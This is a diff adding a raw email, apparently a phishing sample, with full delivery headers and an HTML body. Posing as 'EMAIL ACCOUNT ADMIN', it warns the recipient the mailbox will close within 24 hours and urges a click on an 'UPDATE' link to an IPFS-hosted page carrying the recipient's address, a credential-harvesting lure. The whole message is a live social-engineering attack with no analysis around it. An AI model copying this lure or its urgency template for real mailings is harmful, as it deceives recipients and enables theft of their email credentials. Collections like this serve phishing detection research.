@@ -1,0 +1,105 @@
+Return-Path: sales@c-chats.life
+Delivered-To: jose@monkey.org
+X-FDA: 80131339932.21.2681A19
+Received: from c-chats.life (c-chats.life [106.75.12.158])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP id E4444C2113F
+	for <jose@monkey.org>; Mon, 14 Nov 2022 08:16:05 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default; d=c-chats.life;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding; i=sales@c-chats.life;
+ bh=S/RqD3TVaVxEscSJLwkz7p4WUEc=;
+ b=GdlaWwhkpFJ/k1gXliFhHk5tezeMfKYEa03/cjBy4yvetdJhlbNaXiGrImoJgFJYJlj6axzHF+rR
+   VIzP2M6zWqVcv4H+vXLOWUJEQJR7ifL/OVTkcFUNyvkEn1jXRC5FnmdnYdbqZZhDGukdG8ikEUgP
+   Hv71MztiVi2Kgu2xS+c=
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=default; d=c-chats.life;
+ b=LKyCN+uEdMxD6xDy8WZX9IgN6wABeNfVldIcyeB5Ej6yXLrWTCueo2VPDEHeJHv2hWNu1Mkaj3Pe
+   m7YajkHQ0/udS9qdMOPSNJ1MHnzWEkpCF9tWU8zR6xXl/9RkCprJK7g+BUrAAjFwQNEulqBer9Jk
+   TRrTFI0GrV4+c5h2H3w=;
+From: EMAIL ACCOUNT ADMIN<sales@c-chats.life>
+To: jose@monkey.org
+Subject: FINAL WARNING : YOUR E-MAIL WILL CLOSE WITHIN 24 HOURS
+Date: 14 Nov 2022 00:05:45 -0800
+Message-ID: <20221113233219.07BB68016B8D37BF@c-chats.life>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+ARC-Authentication-Results: i=1;
+	imf25.b.hostedemail.com;
+	dkim=pass header.d=c-chats.life header.s=default header.b=GdlaWwhk;
+	dmarc=pass (policy=quarantine) header.from=c-chats.life;
+	spf=pass (imf25.b.hostedemail.com: domain of sales@c-chats.life designates 106.75.12.158 as permitted sender) smtp.mailfrom=sales@c-chats.life
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1668413766; a=rsa-sha256;
+	cv=none;
+	b=fcZVFdWes/VygA8fWDe5JxifaOKU7u/Ia8AE36CiVgdtGH3Hg1N+4yC0yH5f8/wJ/9Cggn
+	tO0oVUI/ktZFeACHRIEOx0JWH4ILHhCcfQ4omay8xHAZmBcK0N+CG42aa8lm+82/alT4UO
+	/VT7I+7kDnmh6i8ldpgtAeumKNdjQ5A=
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1668413766;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=/1SJC7h6O52ToZ+evObDFUd7dtLgd8CNZMt0LPT53/s=;
+	b=lDCPjsS9JKvq6OBcITNn8B7ENGOEtziLOgC0nZoBoKRXxt38MFLJhasUlCeWxDRUXe5Zr/
+	27lNpAata2M0WWmK50CAHCAmTkMl1zT6ax6v3SItxFEEw9Cggwr21ih8GKmJOP1fEw/dBg
+	bl3I/4GDlS2i91xcERAS3Ap3CBfrTR0=
+X-Stat-Signature: eq9sdj7ai7fu3iidedp6cbwmrf4hq3ee
+X-Spam-Status: No, score=4.18
+X-Rspamd-Server: rspam09
+X-Rspamd-Queue-Id: E4444C2113F
+Authentication-Results: imf25.b.hostedemail.com;
+	dkim=pass header.d=c-chats.life header.s=default header.b=GdlaWwhk;
+	dmarc=pass (policy=quarantine) header.from=c-chats.life;
+	spf=pass (imf25.b.hostedemail.com: domain of sales@c-chats.life designates 106.75.12.158 as permitted sender) smtp.mailfrom=sales@c-chats.life
+X-Rspam-User: 
+X-HE-Tag: 1668413765-841508
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 196
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19003"></head>
+<body><p style=3D'color: rgb(29, 34, 40); text-transform: none; text-indent=
+: 0px; letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Ar=
+ial, sans-serif; font-size: 13px; font-style: normal; font-weight: 400; wor=
+d-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-colo=
+r: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-colo=
+r: initial; font-variant-ligatures: normal; font-variant-caps: normal; -web=
+kit-text-stroke-width: 0px;'>Dear jose</p>
+<p style=3D'color: rgb(29, 34, 40); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, s=
+ans-serif; font-size: 13px; font-style: normal; font-weight: 400; word-spac=
+ing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb=
+(255, 255, 255); text-decoration-style: initial; text-decoration-color: ini=
+tial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px;'>
+You would be blocked from sending and receiving emails if not confirmed wit=
+hin 24hrs of receiving this automated mail.</p>
+<p style=3D'color: rgb(29, 34, 40); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, s=
+ans-serif; font-size: 13px; font-style: normal; font-weight: 400; word-spac=
+ing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb=
+(255, 255, 255); text-decoration-style: initial; text-decoration-color: ini=
+tial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px;'>
+You are required to update through the link below.</p>
+<p style=3D'color: rgb(29, 34, 40); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, s=
+ans-serif; font-size: 13px; font-style: normal; font-weight: 400; word-spac=
+ing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb=
+(255, 255, 255); text-decoration-style: initial; text-decoration-color: ini=
+tial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px;'>
+<a title=3D"" style=3D"color: rgb(25, 106, 212);" href=3D"https://bafybeicl=
+z4doh4frasepzxektvwmh5b2vsfnznxlp4prh5tgjgcmrwkfbm.ipfs.w3s.link/egmx.html?=
+x=3Djose@monkey.org">UPDATE</a></p>
+<p style=3D'color: rgb(29, 34, 40); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, s=
+ans-serif; font-size: 13px; font-style: normal; font-weight: 400; word-spac=
+ing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb=
+(255, 255, 255); text-decoration-style: initial; text-decoration-color: ini=
+tial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px;'>Thanks,<br><br>
+E-mail Account Services</p></body></html>
+
